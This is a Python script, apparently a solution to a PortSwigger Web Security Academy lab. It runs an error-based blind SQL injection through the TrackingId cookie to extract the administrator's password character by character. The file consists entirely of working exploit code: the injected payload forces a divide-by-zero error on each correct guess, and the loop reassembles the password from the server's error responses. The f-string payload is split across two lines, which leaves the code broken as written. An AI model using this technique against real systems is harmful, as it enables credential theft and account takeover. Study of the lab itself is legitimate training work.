import requests

# URL a la que se realizará la solicitud
url = "https://0a6700a6033046438284066900240003.web-security-academy.net/"
 
chars = [
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
]

headers = {
    'Sec-Ch-Ua': '"Chromium";v="129", "Not=A?Brand";v="8"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"macOS"',
    'Accept-Language': 'en-US,en;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-User': '?1',
    'Sec-Fetch-Dest': 'document',
    'Referer': 'https://0a1800bf0401779287f4b5990076002b.web-security-academy.net/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Priority': 'u=0, i'
}
passw= ""

search_string = "Welcome back"


x=1
while x<21:
    for char in chars:
        tracking_id = f"voMmVKA77E2I8VXb'||(SELECT CASE WHEN SUBSTR(password,{x},1)='{char}' THEN TO_CHAR(1/0) 
        ELSE '' END FROM users WHERE username='administrator')||'"
        cookies = {
    'TrackingId': tracking_id,
    'session': 'x7PgItA2N4KpZol8UzhxHKQFTXb9z525'
}
        response = requests.get(url, headers=headers, cookies=cookies)
        if response.status_code !=200:
            passw=passw+char
            break
        else:
            pass
    x+=1
    print(passw)
